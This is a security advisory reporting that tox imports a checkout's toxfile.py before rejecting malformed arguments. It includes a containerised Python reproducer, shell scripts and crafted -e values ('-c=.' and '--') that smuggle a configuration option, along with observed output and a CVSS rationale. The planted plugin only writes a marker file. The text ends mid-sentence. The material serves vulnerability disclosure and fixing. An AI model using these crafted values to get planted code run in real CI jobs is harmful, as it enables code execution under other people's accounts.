description:
## Summary

Unselected toxfile.py runs before argument validation. Anthropic OSS Scanner reported this as ANT-2026-BTGRA21M on
2026-10-22.

## Affected area

Configuration discovery and inline plugins.

## Attacker-controlled input

The operator starts tox from a contributor checkout and selects an operator-controlled configuration at
`<work>/ci/tox.toml` with `-c`. The contributor controls one value passed to `-e` and the checkout's `toxfile.py`; they
do not control the selected configuration or a plugin beside it.

## Affected code

[`_get_base()` in `src/tox/config/cli/parse.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/cli/parse.py#L65-L72)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

[`_get_base()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/cli/parse.py#L47-L72)
calls bootstrap `parse_known_args()` before the full parser. Bootstrap parsing treats an `-e` value of `-c=.` as a
configuration option; an `-e` value of `--` stops parsing before the operator's later `-c`. Either path makes
`discover_source()` select the checkout. `MANAGER.load_plugins()` then calls
[`load_inline()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/plugin/inline.py#L12-L18),
which imports `toxfile.py` beside that selected configuration before the full parser rejects the command. The control
with an ordinary `-e test` value selects the operator's `<work>/ci/tox.toml` and does not import the checkout plugin.
The contributor-controlled checkout file is outside the operator-selected configuration root.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
checkout/toxfile.py imported, with argv: no
checkout/toxfile.py imported, with argv: ["run", "-c", "/tmp/tox-conf-y1jwv_dt/ci/tox.toml", "-e", "-c=."]
checkout/toxfile.py imported, with argv: ["run", "-e", "--", "-c", "/tmp/tox-conf-y1jwv_dt/ci/tox.toml"]
BUG
```

### Historical release reproduction

These checks use Python 3.11 and pinned tox releases. The control selects the operator's configuration; the attack puts
`--` in the value position before `-c`. The checkout plugin writes a marker only if tox imports it.

```sh
base=$(mktemp -d)
mkdir -p "$base/ci" "$base/checkout"
cat > "$base/ci/tox.ini" <<'INI'
[tox]
env_list = test
[testenv]
package = skip
commands = python -c "print('operator')"
INI
cat > "$base/checkout/tox.ini" <<'INI'
[tox]
env_list = test
[testenv]
package = skip
commands = python -c "print('checkout')"
INI
cat > "$base/checkout/toxfile.py" <<'PY'
from pathlib import Path

Path(__file__).with_name("imported").write_text("yes")
PY

status=0
(cd "$base/checkout" && uvx --python 3.11 --from tox==4.0.0a7 \
    tox4 run -c "$base/ci/tox.ini" -e test) \
    > "$base/control.log" 2>&1 || status=$?
if [ -e "$base/checkout/imported" ]; then imported=yes; else imported=no; fi
printf '4.0.0a7 control: exit=%s imported=%s\n' "$status" "$imported"

for version in 4.0.0a6 4.0.0a7 4.0.0 4.67.4 4.67.5; do
    if [ "$version" = 4.0.0a6 ] || [ "$version" = 4.0.0a7 ]; then tool=tox4; else tool=tox; fi
    rm -f "$base/checkout/imported"
    status=0
    (cd "$base/checkout" && uvx --python 3.11 --from "tox==$version" \
        "$tool" run -e -- -c "$base/ci/tox.ini") \
        > "$base/$version.log" 2>&1 || status=$?
    if [ -e "$base/checkout/imported" ]; then imported=yes; else imported=no; fi
    printf '%s attack: exit=%s imported=%s\n' "$version" "$status" "$imported"
done
printf 'Logs: %s\n' "$base"
```

Observed status lines:

```text
4.0.0a7 control: exit=0 imported=no
4.0.0a6 attack: exit=2 imported=no
4.0.0a7 attack: exit=2 imported=yes
4.0.0 attack: exit=2 imported=yes
4.67.4 attack: exit=2 imported=yes
4.67.5 attack: exit=2 imported=no
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Local account
    participant J as Trusted run
    participant T as tox
    participant S as First CLI parser
    participant F as File system
    A->>F: plant toxfile.py at the selectable path
    A->>J: supply the option value selecting that file
    J->>+T: run with the stated input
    T->>S: parse the value as a configuration option
    Note over T,S: tox imports the planted plugin before argument rejection
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import shutil
import subprocess
import tempfile
from pathlib import Path

TOX = "/opt/venv/bin/tox"

# set up: the operator's configuration lives outside the contributor's checkout, and tox is started from the checkout
work = Path(tempfile.mkdtemp(prefix="tox-conf-"))
operator_conf = work / "ci" / "tox.toml"
checkout = work / "checkout"
operator_conf.parent.mkdir()
checkout.mkdir()
shutil.copy("/tmp/repro.d/operator_tox.toml", operator_conf)
shutil.copy("/tmp/repro.d/contributor_tox.toml", checkout / "tox.toml")
shutil.copy("/tmp/repro.d/contributor_toxfile.py", checkout / "toxfile.py")
marker = checkout / "toxfile_imported.json"  # written by checkout/toxfile.py on import


def run_tox(*args):
    marker.unlink(missing_ok=True)
    result = subprocess.run([TOX, *args], cwd=checkout, capture_output=True, text=True)
    print("$ tox", " ".join(args))
    print(result.stdout, end="")
    print("exit code", result.returncode)
    if result.stderr:
        print(result.stderr.strip().splitlines()[-1])
    print("checkout/toxfile.py imported, with argv:", marker.read_text() if marker.exists() else "no")
    print()
    return result


# control: the operator's command line with an ordinary value for -e
control = run_tox("run", "-c", str(operator_conf), "-e", "test")
assert "operator test env ran" in control.stdout, control.stderr
imported_by_control = marker.exists()

# attack: only the value of -e is the contributor's
run_tox("run", "-c", str(operator_conf), "-e", "-c=.")  # "." is the cwd, the checkout
imported_by_dash_c = marker.exists()
run_tox("run", "-e", "--", "-c", str(operator_conf))  # -c after -e: tox cuts argv at the first "--" before parsing
imported_by_dash_dash = marker.exists()

# check: with -c given, only a toxfile.py beside that file may be imported, never the checkout's
print("BUG" if not imported_by_control and (imported_by_dash_c or imported_by_dash_dash) else "OK")
```

**repro.d/contributor_tox.toml**

```toml
[env.test]
package = "skip"
commands = [["python", "-c", "print('contributor test env ran')"]]
```

**repro.d/contributor_toxfile.py**

```python
import json
import sys
from pathlib import Path

Path(__file__).with_name("toxfile_imported.json").write_text(json.dumps(sys.argv[1:]))
```

**repro.d/operator_tox.toml**

```toml
[env.test]
package = "skip"
commands = [["python", "-c", "print('operator test env ran')"]]
```

**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

The reproduction ran attacker-controlled code under the tox account. The reproducer does not establish that a typical
tox run has this input source. Exposure is niche because the attack needs a value passed to -e or another value-taking
option; a toxfile.py at a location that value selects.

Severity: CVSS v4.0 base 5.3 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The victim must pass the outside-controlled value to an option that selects a configuration path while an
  attacker-writable `toxfile.py` exists at that path.
- `PR:L`: The attacker needs permission to create or swap an entry in a local directory.
- `UI:P`: A trusted user or job must run tox after the attacker prepares the path.
- `VC:H`: The reproduced code runs with access to the tox account's files.
- `VI:H`: The attacker-controlled code runs with the tox account's write permissions.
- `VA:L`: The attacker-controlled code can stop one tox invocation. The reproduction does not establish sustained or
  persistent denial of tox or a direct, serious availability consequence.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

[`2b42e124afc528c4ecd45a3e4caceca831e6e856`](https://github.com/gaborbernat/tox/commit/2b42e124afc528c4ecd45a3e4caceca831e6e856)

`toxfile.py` after `-e --` input, before argument rejection. The five earlier published prereleases, 4.0.0a2 through
